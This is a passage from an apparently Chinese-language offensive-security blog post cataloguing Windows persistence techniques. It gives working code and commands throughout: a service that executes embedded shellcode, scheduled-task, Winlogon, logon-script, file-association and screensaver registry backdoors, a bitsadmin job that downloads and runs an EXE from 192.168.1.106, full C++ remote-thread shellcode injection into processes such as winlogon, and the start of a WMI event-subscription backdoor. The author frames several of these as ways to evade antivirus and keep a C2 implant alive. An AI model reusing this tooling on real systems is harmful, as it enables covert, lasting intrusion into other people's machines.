<span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Report current status  */</span><br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sddd&quot;</span>);<br>    <span class="hljs-keyword">int</span> error;<br>    ServiceStatus.dwServiceType =<br>        SERVICE_WIN32;<br>    ServiceStatus.dwCurrentState =<br>        SERVICE_START_PENDING;<br>    <span class="hljs-comment">/*在本例中只接受系统关机和停止服务两种控制命令*/</span><br>    ServiceStatus.dwControlsAccepted =<br>        SERVICE_ACCEPT_SHUTDOWN |<br>        SERVICE_ACCEPT_STOP;<br>    ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwServiceSpecificExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br>    hStatus = ::<span class="hljs-built_in">RegisterServiceCtrlHandler</span>(<br>        WserviceName,<br>        (LPHANDLER_FUNCTION)CtrlHandler);<br>    <span class="hljs-keyword">if</span> (hStatus == (SERVICE_STATUS_HANDLE)<span class="hljs-number">0</span>)<br>    &#123;<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler failed&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler success&quot;</span>);<br>    <span class="hljs-comment">/* Initialize Service   */</span><br>    error = <span class="hljs-built_in">InitService</span>();<br>    <span class="hljs-keyword">if</span> (error)<br>    &#123;<br>        <span class="hljs-comment">/* Initialization failed  */</span><br>        ServiceStatus.dwCurrentState =<br>            SERVICE_STOPPED;<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br><br>    <span class="hljs-comment">/*向SCM 报告运行状态*/</span><br>    ServiceStatus.dwCurrentState =<br>        SERVICE_RUNNING;<br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br><br>    <span class="hljs-comment">/*do something you want to do in this while loop*/</span><br>    MEMORYSTATUS memstatus;<br>    <span class="hljs-keyword">while</span> (ServiceStatus.dwCurrentState ==<br>        SERVICE_RUNNING)<br>    &#123;<br>        <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">16</span>];<br>        <span class="hljs-built_in">GlobalMemoryStatus</span>(&amp;memstatus);<br>        <span class="hljs-keyword">int</span> availmb = memstatus.dwAvailPhys / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>;<br>        <span class="hljs-built_in">sprintf_s</span>(buffer, <span class="hljs-number">100</span>, <span class="hljs-string">&quot;available memory is %dMB&quot;</span>, availmb);<br>        <span class="hljs-keyword">int</span> result = <span class="hljs-built_in">WriteToLog</span>(buffer);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>            ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>            <span class="hljs-built_in">SetServiceStatus</span>(hStatus,<br>                &amp;ServiceStatus);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-built_in">Sleep</span>(SLEEP_TIME);<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;service stopped&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这其实也是psexec的原理:建立连接后创建服务反弹shell</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/12.png"></p><p>删除服务:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">sc <span class="hljs-keyword">delete</span> <span class="hljs-string">&quot;SD&quot;</span><br></code></pre></td></tr></table></figure><h1 id="0x04-系统计划任务后门"><a href="#0x04-系统计划任务后门" class="headerlink" title="0x04 系统计划任务后门"></a>0x04 系统计划任务后门</h1><p>Windows实现定时任务主要有schtasks与at二种方式:</p><p>At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后</p><p>每五分钟执行一次</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> minute <span class="hljs-string">/mo</span> 5   <span class="hljs-string">/tn</span> <span class="hljs-string">&quot;sd&quot;</span> <span class="hljs-string">/tr</span> C:\Windows\System32\cmd.exe<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/13.png"></p><h1 id="0x05-DLL劫持"><a href="#0x05-DLL劫持" class="headerlink" title="0x05 DLL劫持"></a>0x05 DLL劫持</h1><p>DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p><ol><li>程序所在⽬录。</li><li>加载 DLL 时所在的当前⽬录。</li><li>系统⽬录即 SYSTEM32 ⽬录。</li><li>16位系统⽬录即 SYSTEM ⽬录。</li><li>Windows⽬录。</li><li>PATH环境变量中列出的⽬录</li></ol><p>dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</p><p>在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\S</span>essionManager<span class="hljs-symbol">\E</span>xcludeFromKnownDlls<br></code></pre></td></tr></table></figure><p>关于dll劫持的文章有很多,也需要去挖掘。</p><h1 id="0x06-Winlogon用户登录初始化"><a href="#0x06-Winlogon用户登录初始化" class="headerlink" title="0x06 Winlogon用户登录初始化"></a>0x06 Winlogon用户登录初始化</h1><p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:(<a href="https://www.cnblogs.com/punished/p/14715771.html">https://www.cnblogs.com/punished/p/14715771.html</a>)</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKLM<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsNT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon\<br>HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon\<br></code></pre></td></tr></table></figure><p>对这些注册表项的恶意修改可能导致 Winlogon 加载和执行恶意 DLL 或可执行文件。</p><p>命令行:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg delete &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot; /v Userinit /f<br>reg add &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe,&quot; /f<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/14.png"></p><p> 可以powershell一句话更改</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">Set-ItemProperty   &quot;HKLM:<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>INDOWS NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot; -name   Userinit -value &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\u</span>serinit.exe,C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot;<br></code></pre></td></tr></table></figure><h1 id="0x07-Logon-Scripts后门"><a href="#0x07-Logon-Scripts后门" class="headerlink" title="0x07 Logon Scripts后门"></a>0x07 Logon Scripts后门</h1><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p><p>注册表位置:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HKEY_CURRENT_USER<span class="hljs-string">\Environment</span><br></code></pre></td></tr></table></figure><p>增加键值对</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/15.png"></p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/16.png"></p><h1 id="0x08-文件关联"><a href="#0x08-文件关联" class="headerlink" title="0x08 文件关联"></a>0x08 文件关联</h1><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。可以利用文件的”打开方式”进行关联选择。</p><p>我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联。</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/17.png"></p><p> 用ftype命令显示或修改用在文件扩展名关联中的文件类型。</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/18.png"></p><p>修改\HKEY_CLASS_ROOT\txtfile\shell\open\command的默认值为我们要执行的程序</p><p>修改注册表（管理员权限）：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKCR<span class="hljs-symbol">\t</span>xtfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand&quot; /ve /t REG_EXPAND_SZ /d &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe <span class="hljs-variable">%1&quot; /f</span><br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/19.png"></p><p> 再打开txt文件打开的是cmd</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/20.png"></p><h1 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h1><p>Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p><p>window7以上自带</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/21.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.\bitsadmin.exe <span class="hljs-regexp">/transfer backdoor /</span>download <span class="hljs-regexp">/priority high &quot;http:/</span><span class="hljs-regexp">/192.168.1.106/</span>CM.EXE<span class="hljs-string">&quot; C:\1.exe</span><br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/22.png"></p><p> 将文件放入磁盘后，可以通过从“ bitsadmin ”实用程序执行以下命令来实现持久性。</p><ol><li>在创建参数需要作业的名称</li><li>该addfile需要文件的远程位置和本地路径</li><li>该SetNotifyCmdLine将执行的命令</li><li>所述SetMinRetryDelay定义时间回调（秒）</li><li>该简历参数将运行位工作。</li></ol><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bitsadmin <span class="hljs-string">/create</span> backdoor<br>bitsadmin <span class="hljs-string">/addfile</span> backdoor <span class="hljs-string">&quot;http://192.168.1.106/CM.EXE&quot;</span>  <span class="hljs-string">&quot;C:\1.exe&quot;</span><br>bitsadmin <span class="hljs-string">/SetNotifyCmdLine</span> backdoorC:\1.exe NULbitsadmin <span class="hljs-string">/SetMinRetryDelay</span> <span class="hljs-string">&quot;backdoor&quot;</span> 60 bitsadmin <span class="hljs-string">/resume</span> backdoor<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/23.png"></p><p>这里只是随便找了个exe测试,如果是c2的马的化可以直接上线</p><h1 id="0x10-进程注入"><a href="#0x10-进程注入" class="headerlink" title="0x10 进程注入"></a>0x10 进程注入</h1><p>之所以把注入也放到权限维持来说,因为注入更加隐蔽,尤其是拿到高权限后,难以被发现</p><p>如果是user权限可以考虑注入exploer.exe 如果是system权限则可以注入winlogon或者lassa</p><p>记一次实战中的注入,这里是我自己写的小工具</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/24.png"></p><p>关于dll注入网上已经有很多教程,包括突破session 0,使用ZwCreateThreadEx创建一个线程</p><p>同样还有shellcode注入</p><p>一个demo</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">DWORD <span class="hljs-title">CeatRemoThread</span><span class="hljs-params">(DWORD pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hThread;<br>    DWORD dwOldProtect;<br>    DWORD dwThreadId;<br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf);<br>    <span class="hljs-comment">//混淆</span><br>    <span class="hljs-keyword">char</span>* newBuf;<br><br>    <span class="hljs-built_in">decrypt</span>(buf, shellcode_size, (LPVOID*)&amp;newBuf);<br><br>    HANDLE hHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="hljs-literal">false</span>, pid);<br>    <span class="hljs-keyword">if</span> (hHandle == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;openprocessError&quot;</span>);<br>        <span class="hljs-built_in">free</span>(newBuf);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    LPVOID Memory = <span class="hljs-built_in">VirtualAllocEx</span>(hHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(newBuf) + <span class="hljs-number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br><br>    SIZE_T dwSize = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">WriteProcessMemory</span>(hHandle, Memory, newBuf, shellcode_size / <span class="hljs-number">3</span>, &amp;dwSize);<br>    <span class="hljs-comment">//Sleep(3000);</span><br>    <span class="hljs-built_in">VirtualProtectEx</span>(hHandle, Memory, shellcode_size / <span class="hljs-number">3</span>, PAGE_EXECUTE, &amp;dwOldProtect);<br><br><br>    HMODULE hNtdll = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hNtdll == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] LoadNTdll Error,Error is:%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Load ntdll.dll Successfully!\n&quot;</span>);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">        ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">        ULONG CreateThreadFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">        SIZE_T ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">        SIZE_T StackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">        SIZE_T MaximumStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID pUnkown</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">        ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">        BOOL CreateSuspended,</span></span><br><span class="hljs-params"><span class="hljs-function">        DWORD dwStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">        DWORD dw1,</span></span><br><span class="hljs-params"><span class="hljs-function">        DWORD dw2,</span></span><br><span class="hljs-params"><span class="hljs-function">        LPVOID pUnkown</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br>    typedef_ZwCreateThreadEx ZwCreateThreadEx = <span class="hljs-literal">NULL</span>;<br>    ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (ZwCreateThreadEx == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Get ZwCreateThreadEx Address Error,Error is:%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Get ZwCreateThreadEx Address Successfully! Address is %x\n&quot;</span>, ZwCreateThreadEx);<br>    &#125;<br>    HANDLE hRemoteThread = <span class="hljs-literal">NULL</span>;<br>    DWORD ZwRet = <span class="hljs-number">0</span>;<br>    ZwRet = <span class="hljs-built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hHandle,<br>        (LPTHREAD_START_ROUTINE)Memory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (hRemoteThread == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Creat RemoteThread Error,Error is:%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-built_in">getchar</span>();<br>        <span class="hljs-built_in">VirtualFreeEx</span>(hHandle, Memory, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        <span class="hljs-built_in">CloseHandle</span>(hHandle);<br>        <span class="hljs-built_in">FreeLibrary</span>(hNtdll);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hRemoteThread, INFINITE);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x11-屏幕保护程序"><a href="#0x11-屏幕保护程序" class="headerlink" title="0x11 屏幕保护程序"></a>0x11 屏幕保护程序</h1><p><strong>利用前提:对方开启了屏幕保护</strong></p><p>屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p><p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell,达到一定的权限维持。</p><p>注册表位置:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HKEY_CURRENT_USER<span class="hljs-string">\Control</span> Panel<span class="hljs-string">\Desktop</span><br></code></pre></td></tr></table></figure><p>命令行修改:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\C</span>ontrol Panel<span class="hljs-symbol">\D</span>esktop&quot; /v SCRNSAVE.EXE /d C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>md.exe<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/25.png"></p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/26.png"></p><p>这里可以改成我们的马,达到维持权限的效果,具体时间为注册表的ScreenSaverTimeout值有关</p><h1 id="0x12-WMI构造无文件后门"><a href="#0x12-WMI构造无文件后门" class="headerlink" title="0x12 WMI构造无文件后门"></a>0x12 WMI构造无文件后门</h1><p>WMI是一项Windows管理技术，其全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。</p><p>无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。</p><p>通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。</p><p>如果展开讲会讲很久，这里推荐一篇比较详细的文章:<a href="https://wooyun.js.org/drops/WMI%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html">https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$filterName</span> = <span class="hljs-string">&#x27;SD&#x27;</span><br><span class="hljs-variable">$consumerName</span> = <span class="hljs-string">&#x27;SDD&#x27;</span><br><span class="hljs-variable">$exePath</span> = <span class="hljs-string">&#x27;C:\Windows\System32\cmd.exe&#x27;</span><br><span class="hljs-variable">$Query</span> = <span class="hljs-string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;=200 AND TargetInstance.SystemUpTime &lt; 320&quot;</span><br><span class="hljs-variable">$WMIEventFilter</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> __EventFilter <span class="hljs-literal">-NameSpace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;Name=<span class="hljs-variable">$filterName</span>;EventNameSpace=<span 